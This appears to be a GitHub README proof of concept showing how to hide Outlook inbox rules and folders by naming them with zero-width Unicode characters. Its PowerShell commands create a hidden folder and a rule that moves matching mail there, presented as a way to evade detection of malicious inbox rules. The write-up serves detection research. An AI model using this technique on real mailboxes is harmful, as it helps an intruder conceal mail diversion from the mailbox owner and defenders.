## Outlook Hidden Objects - Defense Evasion \ Evading Pattern Detection ##

Yet another way of inbox-manipulation-rules using characters that are hidden in ASCII to "hide" Outlook objects.<br/><br/>




The silly idea came to me from "Search-StringInAD.ps1" which lookup for (hidden) Unicode characters in AD Objects (e.g hidden user):<br/>

https://github.com/YossiSassi/Search-StringInAD/blob/main/Search-StringInAD.ps1



From Microsoft documentation inbox-manipulation-rules Investigation steps:<br/>

https://learn.microsoft.com/en-us/defender-xdr/alert-grading-playbook-inbox-manipulation-rules<br/><br/>



_An attacker might manipulate the Inbox-rule only to emails that contain certain words. You can find these keywords under certain attributes such as: "BodyContainsWords," "SubjectContainsWords," or "SubjectOrBodyContainsWords."_<br/>

Let's say the attacker does not name the rule; it can evade Subject-based pattern detection.<br/>

For example, you can create a "hidden" folder and a hidden Inbox rule and forward emails to the "hidden" folder by simply naming it with hidden Unicode.



* This can't be done via the GUI, so use PowerShell to do so.
* May trigger a web view authentication window to the user.
* equired PowerShell from an elevated shell.
* Tested with PSVersion 5.1.22621.4391.


**Note that it will create a pretty watermark and be present oddly in the UI (See the After screenshot)**





Before:


<img width="500" alt="image" src="https://github.com/user-attachments/assets/18e76455-b809-4a4a-9631-83a50d904067" />





After:


<img width="493" alt="image" src="https://github.com/user-attachments/assets/f861a6ad-87d1-44d2-8375-e39387d33e83" />





After Connecting to ExchangeOnline:


<img width="682" alt="image" src="https://github.com/user-attachments/assets/1df31adb-e1b2-4d76-b617-6721310b992e" />







Hidden Unicodes


"0x200B" = "Zero Width Space (ZWSP)"

"0x200C" = "Zero Width Non-Joiner (ZWNJ)"

"0x200D" = "Zero Width Joiner (ZWJ)"

"0xFEFF" = "Zero Width No-Break Space"




// Install-Module -Name ExchangeOnlineManagement // If prompted, type "Y" to accept and install.

// Connect-ExchangeOnline -UserPrincipalName <your.email@domain.com>

New-MailboxFolder -Parent "your.email:\Inbox" -Name "$([char]0x200B)" // your.email without the @domain.com

Get-MailboxFolder -Identity "<your.email@domain.com>" -Recurse

Get-MailboxFolder -Identity "<your.email@domain.com>:\Inbox" -GetChildren | Format-List Name, FolderPath  // to check "Inbox\ " subfolder 

Get-InboxRule 

New-InboxRule -Name "$([char]0x200B)" -SubjectContainsWords "test" -MoveToFolder "<your.email@domain.com>:\Inbox\$([char]0x200B)"

 Disconnect-ExchangeOnline 
